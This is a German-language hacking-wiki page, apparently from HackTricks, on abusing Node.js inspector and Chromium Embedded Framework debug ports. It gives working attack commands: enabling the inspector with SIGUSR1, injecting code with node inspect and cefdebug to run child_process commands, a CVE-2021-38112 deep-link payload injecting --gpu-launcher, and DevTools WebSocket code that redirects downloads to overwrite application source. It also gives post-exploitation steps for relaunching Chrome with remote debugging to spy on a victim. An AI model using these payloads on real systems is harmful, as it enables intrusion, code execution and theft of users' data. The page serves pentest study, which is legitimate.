# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

[Aus der Dokumentation](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Beim Start mit dem Schalter `--inspect` wartet ein Node.js-Prozess auf einen Debugging-Client. **Standardmäßig** lauscht er unter Host und Port **`127.0.0.1:9229`**. Jedem Prozess wird außerdem eine **eindeutige** **UUID** zugewiesen.<sup>[[4]](#references)</sup>

Inspector-Clients müssen die Hostadresse, den Port und die UUID kennen und angeben, um eine Verbindung herzustellen. Eine vollständige URL sieht etwa so aus: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Da der **Debugger vollständigen Zugriff auf die Node.js-Ausführungsumgebung hat**, kann ein Angreifer, der eine Verbindung zu diesem Port herstellen kann, möglicherweise beliebigen Code im Namen des Node.js-Prozesses ausführen (**potenzielle privilege escalation**).

Es gibt mehrere Möglichkeiten, einen Inspector zu starten:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Wenn du einen inspizierten Prozess startest, wird etwa Folgendes angezeigt:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Prozesse, die auf **CEF** (**Chromium Embedded Framework**) basieren, müssen den Parameter `--remote-debugging-port=9222` verwenden, um den **Debugger** zu öffnen (die SSRF-Schutzmechanismen bleiben sehr ähnlich). Sie werden jedoch **statt** einer **NodeJS**-**Debug**-Sitzung den Browser über das [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) steuern. Dies ist eine Schnittstelle zur Steuerung des Browsers, bietet jedoch keine direkte RCE.<sup>[[5]](#references)</sup>

Wenn du einen überwachten Browser startest, erscheint etwas wie Folgendes:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browser, WebSockets und Same-Origin-Policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Websites, die in einem Webbrowser geöffnet sind, können WebSocket- und HTTP-Anfragen gemäß dem Browser-Sicherheitsmodell stellen. Eine **initiale HTTP-Verbindung** ist erforderlich, um eine **eindeutige Debugger-Session-ID** zu **erhalten**. Die **Same-Origin-Policy** **verhindert**, dass Websites **diese HTTP-Verbindung** herstellen können. Als zusätzliche Sicherheitsmaßnahme gegen [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** überprüft Node.js, dass die **'Host'-Header** der Verbindung entweder eine **IP-Adresse**, **`localhost`** oder genau **`localhost6`** angeben.<sup>[[12]](#references)</sup>

> [!TIP]
> Diese **Sicherheitsmaßnahmen verhindern, den Inspector auszunutzen**, um Code durch **das bloße Senden einer HTTP-Anfrage** auszuführen (was durch das Ausnutzen einer SSRF-Schwachstelle möglich wäre).

### Inspector in laufenden Prozessen starten

Du kannst das **Signal SIGUSR1** an einen laufenden Node.js-Prozess senden, damit dieser den **Inspector** am Standard-Port **startet**. Beachte jedoch, dass du über ausreichende Berechtigungen verfügen musst. Dies kann dir daher **privilegierten Zugriff auf Informationen innerhalb des Prozesses** gewähren, stellt aber **keine direkte Privilegieneskalation** dar.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Dies ist in Containern nützlich, da das **Herunterfahren des Prozesses und Starten eines neuen** mit `--inspect` **keine Option** ist, weil der **Container** zusammen mit dem Prozess **beendet** wird.

### Mit dem Inspector/Debugger verbinden

Um eine Verbindung zu einem **Chromium-basierten Browser** herzustellen, können die URLs `chrome://inspect` bzw. `edge://inspect` für Chrome bzw. Edge aufgerufen werden. Durch Klicken auf die Schaltfläche „Configure“ sollte sichergestellt werden, dass der **Zielhost und -port** korrekt aufgelistet sind. Das Bild zeigt ein Beispiel für Remote Code Execution (RCE):

![Nachdem eine URL für den Zugriff auf den Debugger angezeigt wurde, z. B. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d – Mit dem Inspector/Debugger verbinden: Um eine Verbindung zu einem Chromium-basierten Browser herzustellen, ...](<../../images/image (674).png>)

Über die **Kommandozeile** können Sie eine Verbindung zu einem Debugger/Inspector herstellen mit:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Das Tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) ermöglicht es, lokal laufende **Inspectors** zu **finden** und **Code** in diese zu **injizieren**.<sup>[[1]](#references)[[2]](#references)[[11]](#references)[[13]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Beachten Sie, dass **NodeJS-RCE-Exploits nicht funktionieren**, wenn eine Verbindung zu einem Browser über das [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) besteht (Sie müssen die API überprüfen, um interessante Verwendungsmöglichkeiten dafür zu finden).

## RCE im NodeJS-Debugger/Inspector

> [!TIP]
> Wenn Sie hierher gelangt sind, weil Sie wissen möchten, wie Sie [**RCE durch ein XSS in Electron erhalten, schauen Sie bitte auf dieser Seite nach.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Einige gängige Methoden, um **RCE** zu erhalten, wenn Sie eine Verbindung zu einem Node-**Inspector** herstellen können, verwenden etwas wie (es scheint, dass dies **bei einer Verbindung zum Chrome DevTools Protocol nicht funktioniert**):<sup>[[3]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

Die API kann hier eingesehen werden: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)<sup>[[5]](#references)</sup>\
In diesem Abschnitt liste ich lediglich interessante Dinge auf, die meines Wissens von Personen zur Ausnutzung dieses Protokolls verwendet wurden.

### Parameter Injection via Deep Links

Bei [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) entdeckte Rhino Security, dass eine auf CEF basierende Anwendung einen benutzerdefinierten URI im System (**workspaces://index.html**) **registrierte**, der den vollständigen URI entgegennahm und anschließend die CEF-basierte Anwendung mit einer Konfiguration **startete**, die teilweise aus diesem URI erstellt wurde.<sup>[[8]](#references)</sup>

Es wurde entdeckt, dass die URI-Parameter URL-dekodiert und zum Starten der CEF-Basisanwendung verwendet wurden. Dadurch konnte ein Benutzer das Flag **`--gpu-launcher`** in die **Befehlszeile** **injecten** und beliebige Dinge ausführen.

Ein Payload wie dieser:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Führt eine calc.exe aus.

### Dateien überschreiben

Ändere den Ordner, in dem **heruntergeladene Dateien gespeichert werden**, und lade eine Datei herunter, um häufig verwendeten **Quellcode** der Anwendung mit deinem **Schadcode** zu überschreiben.<sup>[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE und exfiltration

Laut diesem Beitrag: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) ist es möglich, RCE zu erlangen und interne Seiten von theriver zu exfiltrieren.<sup>[[9]](#references)[[10]](#references)</sup>

### Post-Exploitation

In einer realen Umgebung und **nach der Kompromittierung** eines Benutzer-PCs, auf dem ein Chrome/Chromium-basierter Browser verwendet wird, könntest du einen Chrome-Prozess mit **aktiviertem Debugging starten und den Debugging-Port weiterleiten**, sodass du darauf zugreifen kannst. Auf diese Weise kannst du **alles untersuchen, was das Opfer mit Chrome macht, und sensible Informationen stehlen**.<sup>[[7]](#references)</sup>

Die unauffällige Methode besteht darin, **jeden Chrome-Prozess zu beenden** und anschließend etwas wie
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger inspection and exploitation tool](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Visual Studio Code Remote Code Execution via Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - Getting Started](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Abusing Chrome's Debugging Feature to Observe and Control Browsing Sessions Remotely](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - WebDriver RCE via DNS Rebinding and CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - From Bot to RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)

{{#include ../../banners/hacktricks-training.md}}
